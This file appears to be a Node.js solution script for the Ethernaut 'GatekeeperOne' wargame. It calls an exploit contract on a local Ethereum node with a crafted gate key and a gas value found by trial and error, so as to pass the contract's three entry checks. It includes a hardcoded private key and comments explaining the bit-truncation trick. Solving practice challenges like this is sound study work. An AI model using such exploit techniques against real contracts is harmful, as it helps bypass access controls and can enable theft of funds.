// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const gatekeeperOne = require('./build/contracts/GatekeeperOne.json');
const exploit = require('./build/contracts/Exploit.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    '0xfd8bcc98a94bc4d592c5178ea77cc5f6ca5d4d662f913f13dbc37526caced2ca';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();

  const gatekeeperOneAddress = gatekeeperOne.networks[networkId].address;
  const gatekeeperOneContract = new web3.eth.Contract(
    gatekeeperOne.abi,
    gatekeeperOneAddress,
  );
  const exploitAddress = exploit.networks[networkId].address;
  const exploitContract = new web3.eth.Contract(exploit.abi, exploitAddress);

  let entrant = await gatekeeperOneContract.methods
    .entrant()
    .call({from: publicKey});
  console.log('Entrant:', entrant);

  // The following is what we need to pass in solidity:
  // require(uint32(_gateKey) == uint16(_gateKey));
  // require(uint32(_gateKey) != uint64(_gateKey));
  // require(uint32(_gateKey) == uint16(tx.origin));
  //
  // uintXX describes the amount of bits used in describing the integer. uint32
  // has a 32 bit binary representation. uint16 cuts of all bytes except for
  // the last two from the right hand side as seen in hexadecimal representation
  // : https://github.com/ethereum/solidity-examples/blob/master/docs/bytes/Bytes.md
  // This means uint32(_gateKey) will be seen by Solidity as 0x000072199, which
  // means its value will be the same as uint16(_gateKey).
  //
  // We prefix a 1 to our gateKey so that when uint64(_gateKey) is evaluated
  // we produce a very high number different from uint32(_gateKey).
  //
  // uint16(tx.origin) will be cut of exactly the same as uint16(_gateKey),
  // meaning it's equal to uint32(_gateKey).
  //
  const gateKey = '0x100000000000' + publicKey.substring(38, 42);

  // For the gas I had two ideas: One was that I would create a loop in the
  // smart contract that would use the OPCODE "STEP" to reduce the gas to a
  // given amount and then continue. That turned out to be super complicated
  // however. It would mean that I'd have to count OPCODES until GateTwo and
  // then subtract their value from my gas limit here.
  // I opted for a simpler but uglier solution.
  //
  // In the contract, I declared uint gas = gasleft(). I then inspected the
  // variable with truffle at the time of execution. I took that to find the
  // remainder of 8191. With that I thought I had the solution. However,
  // require(msg.gas % 8191 == 0) also requires gas.  What I did then was to
  // create a loop in this file to alter the gas amount by 1 for each send
  // until I found a perfect gas value for this version of Solidity. Not the
  // prettiest but it works.
  await exploitContract.methods
    .pwn(gateKey)
    .send({from: publicKey, gas: web3.utils.toHex(198584)});

  entrant = await gatekeeperOneContract.methods
    .entrant()
    .call({from: publicKey});
  console.log('Entrant:', entrant);
})();
